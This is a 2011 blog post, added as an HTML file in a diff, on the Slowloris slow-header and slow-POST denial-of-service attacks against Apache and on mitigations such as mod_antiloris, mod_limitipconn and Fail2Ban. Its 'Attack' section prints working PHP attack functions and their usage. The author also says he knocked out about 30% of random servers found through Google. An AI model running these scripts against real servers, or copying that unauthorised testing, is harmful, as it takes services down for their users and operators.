@@ -1,0 +1,367 @@
+<!DOCTYPE html>
+<head>
+	<meta charset="utf-8" />
+	<meta name="viewport" content="width=device-width" />
+
+	<title>Slowloris And Mitigations For Apache</title>
+
+	<link rel="stylesheet" href="http://blog.macuyiko.com/theme/css/normalize.css" />
+	<link rel="stylesheet" href="http://blog.macuyiko.com/theme/css/foundation.min.css" />
+	<link rel="stylesheet" href="http://blog.macuyiko.com/theme/css/style.css" />
+	<link rel="stylesheet" href="http://blog.macuyiko.com/theme/css/pygments.css" />	
+	<script src="http://blog.macuyiko.com/theme/js/jquery-2.0.3.min.js"></script>
+	<script src="http://blog.macuyiko.com/theme/js/custom.modernizr.js"></script>
+	<link href='http://fonts.googleapis.com/css?family=Roboto+Slab:400,700|Open+Sans|Source+Code+Pro:400,500' rel='stylesheet' type='text/css'>
+	
+	<script type="text/javascript">
+	var waitForFinalEvent = (function () {
+		var timers = {};
+		return function (callback, ms, uniqueId) {
+			if (!uniqueId) uniqueId = "_";
+			if (timers[uniqueId]) clearTimeout (timers[uniqueId]);
+			timers[uniqueId] = setTimeout(callback, ms);
+		};
+	})();
+	var insertCaptions = function() {
+		$('#articlecontainer .caption').remove();
+		var width = $(window).width();
+		var onmobile = width < 960; //>
+		var capclass = onmobile ? 'caption-below' : 'caption-aside';
+		$.each($('#articlecontainer img'), function(index, value) {
+			if ($(value).attr('alt') != undefined) {
+				var elem = $('<div class="caption '+capclass+'">'+$(value).attr('alt')+'</div>');
+				if (onmobile) elem.insertAfter(value);
+				else elem.insertBefore(value);
+			}
+		});
+	};
+	$(function() {
+		$(window).resize(function () {
+			waitForFinalEvent(function(){
+				insertCaptions();
+			}, 500, "window.resize");
+		});
+		insertCaptions();
+	});
+	</script>
+	<script type="text/javascript">
+		var _gaq = _gaq || [];
+		_gaq.push(['_setAccount', 'UA-60406-11']);
+		_gaq.push(['_trackPageview']);
+
+		(function() {
+			var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+			ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+			var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+		})();
+	</script>
+</head>
+
+<body>
+
+<nav>
+	<div class="top-bar large-12 columns">
+		<h1><a href="http://blog.macuyiko.com/">Bed Against The Wall</a></h1>
+	</div>
+</nav>
+
+
+<div class="row contentwrapper">
+	<div class="row">
+<div id="articlecontainer" class="large-9 columns large-centered">
+	<article>
+		<header>
+			<div class="article-info">wo 12 januari 2011, by Seppe "Macuyiko" vanden Broucke</div>
+			<div class="article-title"><a href="http://blog.macuyiko.com/post/2011/slowloris-and-mitigations-for-apache.html" rel="bookmark"
+			title="Permalink to Slowloris And Mitigations For Apache">Slowloris And Mitigations For&nbsp;Apache</a></div>
+		</header>
+	
+	    <h1>Introduction</h1>
+<p>If you are the least bit interested in network security, you&#8217;ll undoubtedly have heard about Slowloris by&nbsp;now.  </p>
+<blockquote>
+<p>Slowloris is a piece of software written by Robert &#8220;RSnake&#8221; Hansen which allows a single machine to take down another machine&#8217;s web server with minimal bandwidth and side effects on unrelated services and ports. Slowloris tries to keep many connections to the target web server open and hold them open as long as possible. It accomplishes this by opening connections to the target web server and sending a partial request. Periodically, it will send subsequent <span class="caps">HTTP</span> headers, adding to&#8212;but never completing&#8212;the request. Affected servers will keep these connections open, filling their maximum concurrent connection pool, eventually denying additional connection attempts from clients. (From: <a href="http://en.wikipedia.org/wiki/Slowloris">Wikipedia</a>)
+The attack is <span class="caps">HTTP</span>-based, and attacks webservers by making lots of keep-alive connections and keeping them alive by sending bogus <span class="caps">HTTP</span> headers. The server&#8217;s connection pool gets filled and no other clients can be served. The attack is said to work on a large number of webservers, according to the <a href="http://ha.ckers.org/slowloris/">project page</a>:<br />
+  - Apache 1.x
+  - Apache 2.x
+  - dhttpd
+  - GoAhead WebServer
+  - WebSense &#8220;block pages&#8221; (unconfirmed)
+  - Trapeze Wireless Web Portal (unconfirmed)
+  - Verizon&#8217;s <span class="caps">MI424</span>-<span class="caps">WR</span> <span class="caps">FIOS</span> Cable modem (unconfirmed)
+  - Verizon&#8217;s Motorola Set-Top Box (port 8082 and requires auth - unconfirmed)
+  - BeeWare <span class="caps">WAF</span> (unconfirmed)
+  - Deny All <span class="caps">WAF</span> (unconfirmed)
+And does not affect:<br />
+  - <span class="caps">IIS6</span>.0
+  - <span class="caps">IIS7</span>.0
+  - lighttpd
+  - Squid
+  - nginx
+  - Cherokee (verified by user community)
+  - Netscaler
+  - Cisco <span class="caps">CSS</span> (verified by user community)
+Recently, the method was placed in the spotlights again, because both Wikileaks-supporters and non-supporters were using it to <span class="caps">DOS</span> a variety of websites and Wikileaks mirrors. Also, recently, an alternative <span class="caps">HTTP</span>-based <span class="caps">DOS</span> method was found, using <span class="caps">POST</span> requests with a large content length (<a href="http://www.darkreading.com/vulnerability-management/167901026/security/application-security/228400147/new-http-post-ddos-attack-tools-released.html">article</a>).  </p>
+</blockquote>
+<h1>Attack</h1>
+<p>I run Apache, so, naturally, I was (and still am) concerned about this attack vector. The first step in preventing and solving security problems lies in understanding the attack. Luckily, in this case, the attack is devilishly simple. Based on a <span class="caps">PHP</span> version of the original Slowloris attack (<a href="http://seclists.org/fulldisclosure/2009/Jun/207">found here</a>), I wrote a modified script which also included the new <span class="caps">POST</span>-based attack method. The extended version of the script can be found on <a href="https://gist.github.com/771824">Github</a>.<br />
+The usage is&nbsp;straightforward:  </p>
+<div class="highlight"><pre>./scriptname.php &lt;method&gt; &lt;number of processes&gt; &lt;server&gt; [host]`
+</pre></div>
+
+
+<p>Where:<br />
+  - <code>&lt;method&gt;</code> is either &#8220;get&#8221; for the &#8220;slow-headers&#8221; based attack, or &#8220;post&#8221; for the new variant;/li&gt;
+  - <code>&lt;number of processes&gt;</code> determines the number of concurrent requests, around 300 does the trick in most cases;
+  - <code>&lt;server&gt;</code> is the hostname or <span class="caps">IP</span> address of the server you want to target;
+  - <code>[host]</code> is an optional parameter which will be used in the &#8220;Host:&#8221;-request header. If left blank the same value as  will be used.
+The script really illustrates how simple the attacks are, lets comment a bit on the <code>attack_get</code> function: <br />
+    function attack_get($server, $host){
+        # The following lines set up a normal <span class="caps">HTTP1</span>.1 <span class="caps">GET</span> request with Keep-Alive
+        $request  = &#8220;<span class="caps">GET</span> / <span class="caps">HTTP</span>/1.1\r\n&#8221;;
+        $request .= &#8220;Host: $host\r\n&#8221;;
+        # Spoof User-Agent (can be changed)
+        $request .= &#8220;User-Agent: Mozilla/4.0 (compatible; <span class="caps">MSIE</span> 7.0; Windows <span class="caps">NT5</span>.1; .<span class="caps">NET</span> <span class="caps">CLR</span> 1.1.4322; .<span class="caps">NET</span> <span class="caps">CLR</span> 2.0.50727)\r\n&#8221;;
+        # The following header is, strictly speaking, not necessary, all <span class="caps">HTTP1</span>.1 requests are kept alive
+        $request .= &#8220;Keep-Alive: 900\r\n&#8221;;
+        # Just make the Content-Length large enough
+        $request .= &#8220;Content-Length: &#8221; . rand(10000, 1000000) . &#8220;\r\n&#8221;;
+        $request .= &#8220;Accept: <em>.</em>\r\n&#8221;;
+        # First custom header, name can be changed
+        $request .= &#8220;X-a: &#8221; . rand(1, 10000) . &#8220;\r\n&#8221;;
+        # Open socket to webserver and send request
+        $sockfd = @fsockopen($server, 80, $errno, $errstr);
+        @fwrite($sockfd, $request);
+        while (true){
+         # Try adding another bogus header
+            if (@fwrite($sockfd, &#8220;X-c:&#8221; . rand(1, 100000) . &#8220;\r\n&#8221;)){
+             # Sleep for a bit
+                sleep(15);
+            }else{
+                # Sending failed
+            }
+        }
+    }
+The <code>attack_post</code> function works very similar: <br />
+    function attack_post($server, $host){
+        # Send a post request to a random location, eventually you could change this to make sure you post to an existing <span class="caps">URL</span>
+        $request  = &#8220;<span class="caps">POST</span> /&#8221;.md5(rand()).&#8221; <span class="caps">HTTP</span>/1.1\r\n&#8221;;
+        $request .= &#8220;Host: $host\r\n&#8221;;
+        $request .= &#8220;User-Agent: Mozilla/4.0 (compatible; <span class="caps">MSIE</span> 7.0; Windows <span class="caps">NT5</span>.1; .<span class="caps">NET</span> <span class="caps">CLR</span> 1.1.4322; .<span class="caps">NET</span> <span class="caps">CLR</span> 2.0.50727)\r\n&#8221;;
+        $request .= &#8220;Keep-Alive: 900\r\n&#8221;;
+        # &#8220;Prepare yourself webserver, we&#8217;re going to send a lot here, ready?&#8221;
+        $request .= &#8220;Content-Length: 1000000000\r\n&#8221;;
+        $request .= &#8220;Content-Type: application/x-www-form-urlencoded\r\n&#8221;;
+        $request .= &#8220;Accept: <em>.</em>\r\n&#8221;;
+        $sockfd = @fsockopen($server, 80, $errno, $errstr);
+        @fwrite($sockfd, $request);
+        while (true){
+            # Send a small bit of content
+            if (@fwrite($sockfd, &#8220;.&#8221;) !== <span class="caps">FALSE</span>){
+                # Sleep for a bit, pretend that &#8220;We&#8217;re a terribly slow browser, so sorry&#8230;&#8221;
+                sleep(1);
+            }else{
+                # Sending failed
+            }
+        }
+    }
+You can also download an <span class="caps">OWASP</span> (Open Web Application Security Project) tool found <a href="http://www.owasp.org/index.php/OWASP_HTTP_Post_Tool">here</a> which does the same. The tool contains a <span class="caps">GUI</span> which lets you choice the attack method (slow headers or slow post), has proxy support, and allows setting attack parameters. The slow header attack can use <span class="caps">GET</span> or <span class="caps">POST</span> requests, whereas my script above can not and only uses <span class="caps">GET</span>. Not that it matters much for that method, as the headers are the crucial factor.<br />
+The attack certainly works. In my testing, I was able to <span class="caps">DOS</span> about 30% of all sampled webservers (retrieved from just random Google results), including my own. A funny side effect of this method is that, once you stop attacking, the server immediately becomes responsive again as the connection pool is freed. The slow post attack worked more reliable in my testing than the slow&nbsp;headers.  </p>
+<h1>Mitigation</h1>
+<p>Preventing the attack is not easy. The Apache developers are <a href="http://article.gmane.org/gmane.comp.apache.devel/37794">aware</a> of the problem, but some architectural changes are needed before the problem will be solved. In the meantime, some users have made some suggestions and/or developed solutions themselves:<br />
+  - Using Apache modules such as mod_limitipconn, mod qos, mod_evasive, mod_security, mod_noloris, and mod_antiloris.
+  - Making some changes to Apache configuration.
+  - Using load balancers or proxies. Setting up <a href="http://www.varnish-cache.org/">Varnish</a> in front of Apache seems to be a popular choice.
+  - Using <span class="caps">IPTABLES</span> to block a lot of simultaneous requests from the same <span class="caps">IP</span>
+  - Using Fail2Ban or similar software to ban <span class="caps">IP</span>&#8217;s based on log data
+  - Making changes to Linux/FreeBSD network parameters using accf, pfctl, sysctl
+Since I want to try to keep things simple, I&#8217;ll look at the Apache configuration, and some helpful&nbsp;modules.  </p>
+<h2>Apache&nbsp;Configuration</h2>
+<p>This mainly concerns tuning the following: <code>KeepAliveTimeout</code> and <code>Timeout</code>.<br />
+<code>Timeout</code> does the following (<a href="http://httpd.apache.org/docs/current/mod/core.html">docs</a>):  </p>
+<blockquote>
+<p>The TimeOut directive defines the length of time Apache will wait for I/O in various&nbsp;circumstances:  </p>
+<p>When reading data from the client, the length of time to wait for a <span class="caps">TCP</span> packet to arrive if the read buffer is&nbsp;empty.  </p>
+<p>When writing data to the client, the length of time to wait for an acknowledgement of a packet if the send buffer is full.
+This helps a bit, but an attacker could just increase his own sending rate (e.g. lower the sleep time in the functions above) to work around this.<br />
+<code>KeepAliveTimeout</code> then does:<br />
+The number of seconds Apache will wait for a subsequent request before closing the connection.
+Again, the problem remains. An attacker could just increase the sending rate. Note that, when using the slow headers method, the <code>Timeout</code> directive above might not help a single bit, since the docs state that:
+Once a request has been received, the timeout value specified by the Timeout directive applies.
+But the full receiving of a request itself takes a long, long time.<br />
+Turning <code>KeepAlive</code> completely off might help, but it is no real remedy. The <span class="caps">POST</span> attack still remains an issue. Tweaking with the Apache options alone is thus certainly not&nbsp;enough.  </p>
+</blockquote>
+<h2>mod_antiloris</h2>
+<p>Some developers have released Apache modules geared to mitigate the Slowloris attack. The two most common ones are <code>mod_antiloris</code> and <code>mod_noloris</code>. Both use the same trick to prevent attacks. They both hook into connection attempts:<br />
+    ap_hook_process_connection(pre_connection, <span class="caps">NULL</span>, <span class="caps">NULL</span>, APR_HOOK_FIRST);
+And count how many connections from the same remote <span class="caps">IP</span> are already in the SERVER_BUSY_READ state (the server is reading data from a client). When this count is too high, subsequent connections get denied:<br />
+    for (i = 0; i &lt; server_limit; ++i) {
+        for (j = 0; j &lt; thread_limit; ++j) {
+            ws_record = ap_get_scoreboard_worker(i, j);
+            switch (ws_record-&gt;status) {
+                case SERVER_BUSY_READ:
+                    if (strcmp(client_ip, ws_record-&gt;client) == 0)
+                        ip_count++;
+                    break;
+                default:
+                    break;
+            }
+        }
+    }
+    if (ip_read_count &gt; conf-&gt;read_limit) {
+        ap_log_error(APLOG_MARK, APLOG_WARNING, 0, <span class="caps">NULL</span>, &#8220;[client %s] rejected, too many connections in <span class="caps">READ</span> state&#8221;, c-&gt;remote_ip);
+        return <span class="caps">OK</span>;
+    } else {
+        return <span class="caps">DECLINED</span>;
+    }
+Installing <a href="http://sourceforge.net/projects/mod-antiloris/">mod_antiloris</a> in Ubuntu is a simple matter of executing:<br />
+<code>$ sudo apt-get install libapache2-mod-antiloris</code>  </p>
+<h2>mod_limitipconn</h2>
+<p>During testing, I discovered that the mod_antiloris module above only protects against the original slow header variant of the Slowloris attack. The slow post was still killing my webserver. So I explored the use of another mod, named <a href="http://dominia.org/djao/limitipconn2.html">mod_limitipconn</a>, which limits simultaneous requests from the same <span class="caps">IP</span>.<br />
+There is no Apache2 module of <code>mod_limitipconn</code> in the Ubuntu repositories, but a Debian deb package is available online and works fine on Ubuntu:<br />
+    # Use the i386 package if you have to&#8230;
+    $ wget http://elonen.iki.fi/code/unofficial-debs/mod-limitipconn/apache2-mod-limitipconn_0.22-2_amd64.deb
+    $ sudo dpkg -i ./apache2-mod-limitipconn_0.22-2_amd64.deb
+    $ sudo a2enmod limitipconn
+Before you restart Apache, create a configuration file at <code>/etc/apache2/conf.d/limitipconn.conf</code>:<br />
+    ExtendedStatus On
+    <IfModule mod_limitipconn.c>
+            <Location />
+                    # Global settings here
+                    MaxConnPerIP 10
+                    # No limit for images
+                    NoIPLimit image/<em>
+            </Location>
+    </IfModule>
+Now the server can be restarted:<br />
+    $ sudo /etc/init.d/apache2 restart <br />
+When investigating the source code of mod_limitipconn, we find the following lines:<br />
+    /</em> Count up the number of connections we are handling right now from
+    * this <span class="caps">IP</span> address */
+    for (i = 0; i &lt; server_limit; ++i) {
+        for (j = 0; j &lt; thread_limit; ++j) {
+            ws_record = ap_get_scoreboard_worker(i, j);
+            switch (ws_record-&gt;status) {
+                case SERVER_BUSY_READ:
+                case SERVER_BUSY_WRITE:
+                case SERVER_BUSY_KEEPALIVE:
+                case SERVER_BUSY_LOG:
+                case SERVER_BUSY_DNS:
+                case SERVER_CLOSING:
+                case SERVER_GRACEFUL:
+                    if (strcmp(address, ws_record-&gt;client) == 0)
+                        ip_count++;
+                    break;
+                default:
+                    break;
+        }
+    }
+Not much different compared to the previous mods, except that <code>mod_limitipconn</code> takes into account all possible server states. Not surprisingly, the attack stopped working after installing this mod. You can disable <code>mod_antiloris</code> when using this module. One might wonder which state actually protects against the slow post attack variant. One would except <code>SERVER_BUSY_READ</code> to intercept these as well, as the server is, in fact, still reading a request from the client and waiting for it to complete. However, as it turns out, the server actually switches to the <code>SERVER_BUSY_WRITE</code> state when receiving a <span class="caps">POST</span>, as described on the <a href="http://www.pubbs.net/200910/httpd/29387-crazy-slowloris-mitigation-patch.html">mailing lists</a>:  </p>
+<blockquote>
+<p>However, there is a real problem with all approaches that look for SERVER_BUSY_READ: The attacker can just use a <span class="caps">URL</span> that accepts <span class="caps">POST</span> requests and send the request body very slowly. These connections have the state SERVER_BUSY_WRITE. This problem affects mod_antiloris and mod_noloris, too (but not mod_reqtimeout). Maybe another state SERVER_BUSY_READ_BODY could be introduced? Or the state could be changed to SERVER_BUSY_READ again when the request body is read?
+Interesting information, and some valid&nbsp;points.  </p>
+</blockquote>
+<h2>Modified&nbsp;mod_antiloris</h2>
+<p>With this in mind I set out to modify mod_antiloris, as I wasn&#8217;t completely happy with mod_limitipconn. The module works great, but provided too much configuration overhead. I wanted something really simple. The source code for mod_antiloris was quickly edited to include a second counter, and to check the request string (i.e. it has to contain &#8220;<span class="caps">POST</span>&#8221;).<br />
+    switch (ws_record-&gt;status) {
+        case SERVER_BUSY_READ:
+            if (strcmp(client_ip, ws_record-&gt;client) == 0){
+         ip_read_count++;
+            }
+            break;
+        case SERVER_BUSY_WRITE:
+            if (<span class="caps">NULL</span> != strstr(ws_record-&gt;request, str_post) &amp;&amp; strcmp(client_ip, ws_record-&gt;client) == 0){
+                ip_write_count++;
+            }
+            break;
+        default:
+            break;
+    }
+I also modified the logging to look a bit more like normal Apache error lines. This will come into play in the next step. The full modified source code is available on <a href="https://gist.github.com/773464">Github</a>.
+Installing and compiling the module requires little work:<br />
+    $ sudo apt-get install gcc apache2-threaded-dev
+    $ wget https://gist.github.com/raw/773464/4e7250692c34f55725384525b513e71be7541f5a/mod_muantiloris.c
+    $ sudo apxs2 -a -i -c mod_muantiloris.c
+    $ sudo /etc/init.d/apache2 restart
+Don&#8217;t forget to disable mod_antiloris and/or mod_limitipconn if you have them enabled (using <code>a2dismod</code>). The modified module uses only two optional configuration directives:<br />
+    IPReadLimit (default 5)<br />
+    IPPostLimit (default 10)<br />
+<strong>Note</strong>: just as with <code>mod_limitipconn</code>, the <code>ExtendedStatus</code> directive should be set to <code>On</code> for this module to work!<br />
+The module blocks both attack variants, and logs to <code>error.log</code> like so:<br />
+<code>[Tue Jan 11 00:11:35 2011] [warn] [client 0.0.0.0] Antiloris rejected, too many connections in READ state</code> <br />
+Mission&nbsp;successful!  </p>
+<h2>Fail2Ban</h2>
+<p>The following step is optional and only recommended if you already have Fail2Ban installed and running. <a href="http://www.fail2ban.org/">Fail2Ban</a> is a handy tool to ban <span class="caps">IP</span>&#8217;s based on regex tests on logfiles. (I&#8217;ve caught dozens of Chinese, Brazilian and Russian trespassers already.)<br />
+I use the following filter in combination with the modified mod_antiloris above:<br />
+    [Definition]
+    # Option:  failregex
+    # Notes.:  regex to match the password failure messages in the logfile. The
+    #          host must be matched by a group named &#8220;host&#8221;. The tag &#8220;&#8221; can
+    #          be used for standard <span class="caps">IP</span>/hostname matching and is only an alias for
+    #          (?:::f{4,6}:)?(?P[\w-.^_]+)
+    # Values:  <span class="caps">TEXT</span>
+    #
+    failregex = [[]client <host>[]] Antiloris rejected, too many (<span class="caps">POST</span>) connections in <span class="caps">WRITE</span> state
+                [[]client <host>[]] Antiloris rejected, too many connections in <span class="caps">READ</span> state
+    # Option:  ignoreregex
+    # Notes.:  regex to ignore. If this regex matches, the line is ignored.
+    # Values:  <span class="caps">TEXT</span>
+    #
+    ignoreregex =
+I do set the <code>bantime</code> to a low value and <code>maxretry</code> parameter to a high amount however, as the module tends to generate a lot of error lines and legitimate, aggressive browsers sometimes like to make a lot of concurrent requests as well (mod_limitipconn did have the added benefit of specifying mime type to ignore, although its recognition is based on a reduced <span class="caps">URI</span> request string from the Apache scoreboard). Fail2Ban uses IPTables, which has the added benefit that once an <span class="caps">IP</span> is banned, Apache can stop dealing with its flooding altogether.<br />
+That concludes this blog post. I hope you&#8217;ve found the material helpful. Feel free to use any code here and on Github as you see&nbsp;fit. </p>
+	</article>
+
+		<hr  class="gradient"/>
+<div class="article-comments">Care to Comment?</div>
+
+<!--
+<div>
+<ul id="commenttabs" style="clear: both;">
+    <li class="active"><a href="#googleplus">Google+</a></li>
+    <li><a href="#facebook">Facebook</a></li>
+    <li><a href="#disqus">Disqus</a></li>
+</ul>
+</div>
+
+<div style="clear: both;"> </div>
+
+<div class="commenttab" id="googleplus">
+	<div class="g-comments" data-href="http://blog.macuyiko.com/post/2011/slowloris-and-mitigations-for-apache.html" data-first_party_property="BLOGGER" data-view_type="FILTERED_POSTMOD">Loading Google+ comments...</div>
+</div>
+
+<div class="commenttab" id="facebook">
+	<div id="fb-root"><div class="fb-comments" data-href="http://blog.macuyiko.com/post/2011/slowloris-and-mitigations-for-apache.html" data-num-posts="20" data-colorscheme="light" data-mobile="auto"></div></div>
+</div>
+-->
+
+<div class="commenttab" id="disqus">
+	<div id="disqus_thread"></div>
+		<script type="text/javascript">
+	    var disqus_shortname = 'macuyiko';
+	    var disqus_identifier = 'post/2011/slowloris-and-mitigations-for-apache.html';
+	    var disqus_title = 'Slowloris And Mitigations For Apache';
+	    var disqus_url = 'http://blog.macuyiko.com/post/2011/slowloris-and-mitigations-for-apache.html';
+
+	    (function() {
+	        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+	        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+	        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+	    })();
+	</script>
+</div></div>
+		
+	</div>
+
+	<footer class="row">
+		<div class="large-12 columns">
+			<hr />
+			<div class="row">
+				<p>Bed Against The Wall by Seppe "Macuyiko" vanden Broucke</p>
+				<p><a href="http://creativecommons.org/licenses/by-sa/2.0/be/" rel="license"><img title="Creative Commons License" src="http://i.creativecommons.org/l/by-sa/2.0/be/88x31.png" /></a><br />
+				Unless mentioned otherwise, this work is licensed under a <a href="http://creativecommons.org/licenses/by-sa/2.0/be/" rel="license">Creative Commons Attribution-Share Alike 2.0 Belgium License</a>.</p>
+				<p>Static blog engine powered by <a href="http://getpelican.com">Pelican</a>.</p>
+			</div>
+		</div>
+	</footer>
+</div>
+ 
